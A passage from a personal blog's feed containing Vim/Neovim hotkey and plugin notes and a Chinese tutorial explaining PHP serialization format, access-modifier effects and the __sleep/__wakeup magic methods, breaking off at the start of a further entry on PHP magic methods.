href="#Recoding-a-macro" class="headerlink" title="Recoding a macro"></a>Recoding a macro</h2><ul><li>Tap <code>q</code> ,then Tap a Character you want,such as <code>a</code></li></ul><p>Vim will recode a macro marked with a</p><ul><li>Do anything you want.</li><li>Tap <code>@</code> + <code>a</code> will execute the macro</li></ul><h1 id="VISUAL-LINE"><a href="#VISUAL-LINE" class="headerlink" title="VISUAL LINE"></a>VISUAL LINE</h1><h2 id="V-LINE-mode"><a href="#V-LINE-mode" class="headerlink" title="V-LINE mode"></a>V-LINE mode</h2><p>Tap the <code>Shift</code>+<code>v</code> could get into the V-LINE mode,and we could batch operate these lines.</p><p>then,Tap the <code>: </code>,we could input the batch operate the lines</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Append 2022- to the beginning of these lines</span></span><br><span class="line">:normal I2022-</span><br><span class="line"><span class="comment"># Tap the Enter key will see the changing</span></span><br></pre></td></tr></table></figure><h2 id="V-BLOCK-mode"><a href="#V-BLOCK-mode" class="headerlink" title="V-BLOCK mode"></a>V-BLOCK mode</h2><p>Tap the <code>Ctrl</code>+<code>v</code> could get into the V-BLOCK mode,and we could batch operate the selected blocks<br>then,Tap the <code>: </code>,we could input the batch operate the lines</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Append 2022- to the beginning of these selected blocks，and Tap the Enter key will see the changing</span></span><br><span class="line">:normal I2022-</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete All the selected blocks</span></span><br><span class="line">d</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit an area in one line,and take effect to all the lines(Tap Esc to make it effective when you have edited)</span></span><br><span class="line">Shift + i</span><br></pre></td></tr></table></figure><h1 id="Vim-Plugs"><a href="#Vim-Plugs" class="headerlink" title="Vim-Plugs"></a>Vim-Plugs</h1><h2 id="preservim-x2F-nerdcommenter"><a href="#preservim-x2F-nerdcommenter" class="headerlink" title="preservim&#x2F;nerdcommenter"></a>preservim&#x2F;nerdcommenter</h2><ul><li><p>Use <code>space(My &lt;LEADER&gt;)</code> + <code>cc</code> to add a comment</p></li><li><p>User <code>space(My &lt;LEADER&gt;)</code> + <code>cu</code> to cancel a comment</p></li></ul><h2 id="tpope-x2F-vim-surround"><a href="#tpope-x2F-vim-surround" class="headerlink" title="tpope&#x2F;vim-surround"></a>tpope&#x2F;vim-surround</h2><ul><li><p>Use <code>cs&quot;&#39;</code> can change the word surrounding become to <code>&#39;</code> from <code>&quot;</code></p></li><li><p>Use <code>cs&quot;&lt;q&gt;</code> can change the word surrounding become to <code>&lt;q&gt;</code> from <code>&quot;</code></p></li><li><p>Use <code>ds&quot;</code>can cancel the word surrounding</p></li></ul><h2 id="tmhedberg-x2F-SimpylFold"><a href="#tmhedberg-x2F-SimpylFold" class="headerlink" title="tmhedberg&#x2F;SimpylFold"></a>tmhedberg&#x2F;SimpylFold</h2><ul><li><p>Use <code>zo</code> to open a folded code block</p></li><li><p>Use <code>zc</code> to close a fold</p></li></ul><h2 id="CoC"><a href="#CoC" class="headerlink" title="CoC"></a>CoC</h2><ul><li>Use <code>space</code> + <code>r</code> + <code>n</code> to rename a variable</li></ul><h2 id="mbbill-x2F-undotree"><a href="#mbbill-x2F-undotree" class="headerlink" title="mbbill&#x2F;undotree"></a>mbbill&#x2F;undotree</h2><p>Add a configuration to the <code>init.vim</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-h&gt;</span> :UndotreeToggle<span class="symbol">&lt;CR&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Use <code>Ctrl</code> + <code>H</code> to open the undotree toggle</li></ul><h2 id="FzF"><a href="#FzF" class="headerlink" title="FzF"></a>FzF</h2><p>Add a configuration to the <code>init.vim</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nnoremap</span>  <span class="symbol">&lt;Leader&gt;</span>C        :Colors<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span>  <span class="symbol">&lt;Leader&gt;</span><span class="keyword">b</span>         :Buffers<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span>  <span class="symbol">&lt;Leader&gt;</span><span class="keyword">f</span>        :Files<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span>  <span class="symbol">&lt;Leader&gt;</span><span class="keyword">l</span>        :Lines<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span>  <span class="symbol">&lt;Leader&gt;</span>ag       :Ag <span class="symbol">&lt;C-R&gt;</span><span class="symbol">&lt;C-W&gt;</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span>  <span class="symbol">&lt;Leader&gt;</span>AG       :Ag <span class="symbol">&lt;C-R&gt;</span><span class="symbol">&lt;C-A&gt;</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">xnoremap</span>  <span class="symbol">&lt;Leader&gt;</span>ag       <span class="keyword">y</span>:Ag <span class="symbol">&lt;C-R&gt;</span><span class="comment">&quot;&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span>  <span class="symbol">&lt;Leader&gt;</span>`        :Marks<span class="symbol">&lt;CR&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Use <code>\&lt;LEADER&gt;</code> + <code>f</code> to search files</li></ul><h2 id="NerdTree"><a href="#NerdTree" class="headerlink" title="NerdTree"></a>NerdTree</h2><p>Add a configuration to the <code>init.vim</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-f&gt;</span> :NERDTreeFind<span class="symbol">&lt;CR&gt;</span></span><br></pre></td></tr></table></figure><p>Use <code>Ctrl</code> + <code>f</code> to open the NerdTree</p><h2 id="mhinz-x2F-vim-startify"><a href="#mhinz-x2F-vim-startify" class="headerlink" title="mhinz&#x2F;vim-startify"></a>mhinz&#x2F;vim-startify</h2><p>Just install the pluggin is well<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Pasted%20image%2020220611135603.png"></p><h2 id="mg979-x2F-vim-visual-multi"><a href="#mg979-x2F-vim-visual-multi" class="headerlink" title="mg979&#x2F;vim-visual-multi"></a>mg979&#x2F;vim-visual-multi</h2><ul><li>When you cursor a word,tap <code>Ctrl</code> + <code>n</code>  to select a word and get into the <em>visual-multi</em> mode</li></ul><p>Then you can change them batching</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Some-hotkey-to-operate-vim&quot;&gt;&lt;a href=&quot;#Some-hotkey-to-operate-vim&quot; class=&quot;headerlink&quot; title=&quot;Some hotkey to operate vim&quot;&gt;&lt;/a&gt;Some hotkey to operate vim&lt;/h1&gt;&lt;h2 id=&quot;Use-vim-plug-in-neovim&quot;&gt;&lt;a href=&quot;#Use-vim-plug-in-neovim&quot; class=&quot;headerlink&quot; title=&quot;Use vim-plug in neovim&quot;&gt;&lt;/a&gt;Use vim-plug in neovim&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The neovim config file is in &lt;code&gt;~/.config/nvim/init.vim&lt;/code&gt;&lt;br&gt;w&lt;br&gt;we should create two directory&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;~/.config/nvim/autoload&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;~/.config/nvim/plugged&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;mkdir&lt;/span&gt; -p ~/.config/nvim/autoload ~/.config/nvim/plugged&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Download vim-plug&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;curl -fLo ~/.config/nvim/autoload/plug.vim https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Toolkit" scheme="https://resek4.github.io/categories/Toolkit/"/>
    
    
  </entry>
  
  <entry>
    <title>php 详解序列化及反序列化特征</title>
    <link href="https://resek4.github.io/2022/02/25/php%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://resek4.github.io/2022/02/25/php%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-02-24T16:00:00.000Z</published>
    <updated>2023-01-27T09:40:17.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li>php 在定义一个数组，类等很多东西的时候，为了数据传递的方便，都可以对一个对象或者实例进行序列化</li></ul><p>对一个<strong>数组</strong>进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized_data</span> . PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;Google&quot;</span>;i:<span class="number">1</span>;s:<span class="number">6</span>:<span class="string">&quot;Runoob&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;Facebook&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><p>对一个<strong>类</strong>进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;a.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;filename.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">a.txt</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;a.txt&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h1><p>拿上面这个类的序列化进行举例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;a.txt&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>O</code> 序列化对象的类型，其中有</p><table><thead><tr><th align="center">类型</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">a</td><td align="center">数组</td></tr><tr><td align="center">b</td><td align="center">布尔值</td></tr><tr><td align="center">d</td><td align="center">双精度浮点型</td></tr><tr><td align="center">i</td><td align="center">整型</td></tr><tr><td align="center">o</td><td align="center">普通对象</td></tr><tr><td align="center">r</td><td align="center">引用</td></tr><tr><td align="center">s</td><td align="center">字符串</td></tr><tr><td align="center">C</td><td align="center">自定义对象</td></tr><tr><td align="center">O</td><td align="center">类</td></tr><tr><td align="center">N</td><td align="center">null值</td></tr><tr><td align="center">R</td><td align="center">指针引用</td></tr><tr><td align="center">U</td><td align="center">Unicode 字符串</td></tr></tbody></table></li><li><p><code>1</code> 序列化的<strong>类名的（字符串）长度</strong></p></li><li><p><code>&quot;F&quot;</code> 是<strong>类名本身（字符串形式）</strong></p></li><li><p><code>1</code> 是这个<strong>类中属性（变量）的数量</strong></p></li><li><p><em>{s:8:”filename”}</em> 中 <code>s</code> 代表<strong><em>属性名</em>（字符串）的类型</strong></p></li><li><p><em>{s:8:”filename”}</em> 中 <code>8</code> 代表<strong><em>属性名</em>（字符串）的长度</strong></p></li><li><p><em>{s:8:”filename”}</em> 中 <code>filename</code> 代表<strong><em>属性名</em>（字符串）本身</strong></p></li><li><p><em>{s:5:”a.txt”}</em> 中 <code>s</code> 代表<strong><em>属性值</em>（字符串）的类型</strong></p></li><li><p><em>{s:5:”a.txt”}</em> 中 <code>5</code> 代表<strong><em>属性值</em>（字符串）的长度</strong></p></li><li><p><em>{s:5:”a.txt”}</em> 中 <code>a.txt</code> 代表<strong><em>属性值</em>（字符串）本身</strong></p></li><li><p><em><strong>序列化结束后的属性内容最后是有一个分号的</strong></em></p></li></ul><h1 id="序列化的访问控制修饰符造成的影响"><a href="#序列化的访问控制修饰符造成的影响" class="headerlink" title="序列化的访问控制修饰符造成的影响"></a>序列化的访问控制修饰符造成的影响</h1><ul><li><strong>protected</strong> 属性被序列化的时候 <strong>属性名</strong> 会变成 <strong><code>%00*%00属性名</code></strong>  </li><li><strong>private</strong> 属性被序列化的时候 <strong>属性名</strong> 会变成 <strong><code>%00类名%00属性名</code></strong></li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>=<span class="string">&#x27;19&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>=<span class="string">&#x27;get flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Ctf&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Sch0lar&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;*age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;19&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;Ctfflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;get flag&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//因为 protected 的影响，序列化后的 s:6:&quot;*age&quot; 星号前后有两个不可见的空格</span></span><br><span class="line"><span class="comment">//因为 private 的影响，序列化后的 s:9:&quot;Ctfflag&quot; 会以空格（不可见） + 类名 + 空格（不可见） + 类名 构成</span></span><br></pre></td></tr></table></figure><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><ul><li><em>魔术方法是不算在序列化中属性内容或属性数量里边的</em></li></ul><h2 id="序列化特别的魔术方法-sleep"><a href="#序列化特别的魔术方法-sleep" class="headerlink" title="序列化特别的魔术方法- __sleep()"></a>序列化特别的魔术方法- <code>__sleep()</code></h2><ul><li>如果在序列化<strong>类</strong>的时候，发现其中有特殊的魔术方法，则会触发不同的序列化效果</li><li><em>该方法决定了类中那些属性需要被序列化</em>。如果有此方法，未指明的属性将不会被序列化，若无此方法，则默认全部序列化</li><li>如果有 <code>__sleep()</code> 方法时，序列化时该方法最先被调用</li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;abedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果，只序列化__sleep()声明 flag 和 age</span></span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Ctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;flag&#123;abedyui&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化特别的魔术方法-wakeup"><a href="#反序列化特别的魔术方法-wakeup" class="headerlink" title="反序列化特别的魔术方法- __wakeup()"></a>反序列化特别的魔术方法- <code>__wakeup()</code></h2><ul><li><em>序列化时不会调用，反序列化时检测到此魔术方法，便会依据该方法内的改变，对类中的属性信息（包括属性名，属性值）进行变更</em></li><li>如果有 <code>__wakeup()</code> 方法时，反序列化时该方法最先被调用</li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag=<span class="string">&#x27;no flag&#x27;</span>;        <span class="comment">//在反序列化时，flag属性将被改变为“no flag”</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="keyword">object</span>(Ctf)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">    [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;no flag&quot;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;Sch0lar&quot;</span></span><br><span class="line">    [<span class="string">&quot;age&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;18&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;php 在定义一个数组，类等很多东西的时候，为了数据传递的方便，都可以对一个对象或者实例进行序列化&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对一个&lt;strong&gt;数组&lt;/strong&gt;进行序列化&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$sites&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;Google&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;Runoob&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;Facebook&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$serialized_data&lt;/span&gt; = &lt;span class=&quot;title function_ invoke__&quot;&gt;serialize&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$sites&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$serialized_data&lt;/span&gt; . PHP_EOL;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//输出结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a:&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;:&amp;#123;i:&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;s:&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&amp;quot;Google&amp;quot;&lt;/span&gt;;i:&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;s:&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&amp;quot;Runoob&amp;quot;&lt;/span&gt;;i:&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;s:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&amp;quot;Facebook&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="TechLearning" scheme="https://resek4.github.io/categories/TechLearning/"/>
    
    
  </entry>
  
  <entry>
    <title>php 魔术方法总结</title>
    <link href="https://resek4.github.io/2022/02/25/php%20%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    <id>https://resek4.github.io/2022/02/25/php%20%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</id>
    <published>2022-02-24T16:00:00.000Z</published>
    <updated>2023-01-27T09:38:41.292Z</updated>
    
